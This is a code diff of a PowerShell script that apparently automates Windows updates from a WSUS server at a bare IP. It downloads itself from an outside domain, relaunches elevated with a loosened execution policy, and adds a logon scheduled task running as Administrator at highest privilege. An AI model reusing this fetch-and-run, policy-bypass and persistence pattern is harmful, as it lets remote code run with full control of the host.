@@ -10,11 +10,11 @@ if ($MyInvocation.MyCommand.Path -ne $scriptPath) {
     Write-Host "Downloading script to $scriptPath ..."
     Invoke-RestMethod -Uri "https://getupdates.me/WSUSUpdateMultiStage.ps1" -OutFile $scriptPath -UseBasicParsing
     Write-Host "Re-launching script from $scriptPath ..."
-    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$scriptPath`"" -Verb RunAs
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy unrestricted -NoProfile -File `"$scriptPath`"" -Verb RunAs
     exit
 }
 # Set execution policy to bypass for this session
-Set-ExecutionPolicy Bypass -Scope Process -Force
+Set-ExecutionPolicy unrestricted -Scope Process -Force
 
 # --- Variables ---
 $wsusServer = "http://23.82.125.157"
@@ -120,7 +120,7 @@ function Schedule-NextRun {
     }
 
     $username = "$env:COMPUTERNAME\Administrator"
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -WindowStyle Normal -File `"$scriptPath`""
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy unrestricted -NoProfile -WindowStyle Normal -File `"$scriptPath`""
     $trigger = New-ScheduledTaskTrigger -AtLogOn
     $principal = New-ScheduledTaskPrincipal -UserId $username -LogonType Interactive -RunLevel Highest
     $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal
